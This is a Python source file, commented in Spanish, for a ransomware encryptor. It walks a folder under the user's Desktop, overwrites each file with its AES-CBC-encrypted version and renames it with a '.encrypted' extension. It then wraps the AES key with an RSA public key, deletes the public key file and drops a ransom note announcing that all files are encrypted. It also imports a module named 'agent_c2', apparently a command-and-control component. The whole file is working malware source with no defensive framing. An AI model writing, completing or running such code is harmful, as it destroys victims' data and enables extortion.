import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from find_files import recorrer_directorio
import ctypes
import os
import agent_c2


def cargar_clave():
    """
    Carga la clave AES desde el archivo aes_key.bin.
    """
    ruta_clave = os.path.abspath("aes_key.bin")
    print(f"Buscando clave en: {ruta_clave}")  # Depuración

    if os.path.exists(ruta_clave):
        with open(ruta_clave, "rb") as clave_file:
            return clave_file.read()
    else:
        raise FileNotFoundError(f"El archivo de clave no se encuentra en: {ruta_clave}")

def cifrar_archivo(archivo, clave):
    """
    Cifra un archivo usando AES en modo CBC y lo sobrescribe con la versión cifrada.
    """
    iv = os.urandom(16)  # Vector de inicialización
    cipher = AES.new(clave, AES.MODE_CBC, iv)
    
    with open(archivo, "rb") as f:
        datos = f.read()
    datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
    with open(archivo, "wb") as f:
        f.write(iv + datos_cifrados)  # Guardamos IV + datos cifrados

def cifrar_clave_aes(clave_aes):
    """
    Cifra la clave AES con la clave pública RSA y la guarda en un archivo.
    """
    if not os.path.exists("rsa_public.pem"):
        raise FileNotFoundError("El archivo de clave pública RSA 'rsa_public.pem' no se encuentra.")
    
    with open("rsa_public.pem", "rb") as f:
        clave_publica = RSA.import_key(f.read())
    
    cipher_rsa = PKCS1_OAEP.new(clave_publica)
    clave_cifrada = cipher_rsa.encrypt(clave_aes)
    
    with open("aes_key_encrypted.bin", "wb") as f:
        f.write(clave_cifrada)
    
    print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")

def cifrar_archivos():
    """
    Cifra todos los archivos importantes encontrados en el directorio y cambia su extensión a '.enc'.
    """
    archivos = recorrer_directorio()  # Se asume que solo devuelve archivos, no diccionarios

    if not isinstance(archivos, list):
        print("Error: No se pudo obtener la lista de archivos.")
        return

    clave = cargar_clave()
    directorio_base = os.path.expanduser("~/Desktop/Files")

    for archivo in archivos:
        ruta_completa = os.path.join(directorio_base, archivo)
        if os.path.isfile(ruta_completa):  # Asegura que es un archivo y no un directorio
            # Cifra el archivo
            cifrar_archivo(ruta_completa, clave)
            
            # Cambia la extensión del archivo a '.enc'
            ruta_nueva = ruta_completa + ".encrypted"
            os.rename(ruta_completa, ruta_nueva)
    
    print("Archivos cifrados y renombrados correctamente.")
    cifrar_clave_aes(clave)
    os.remove("rsa_public.pem")
    # Generar el reporte de archivos cifrados
    directory_ransom_note = os.path.join(directorio_base, "ransom_note.txt")
    with open(directory_ransom_note, "w") as ransom_note:
            ransom_note.write("Todos tus archivos han sido cifrados\n")

if __name__ == "__main__":
    cifrar_archivos()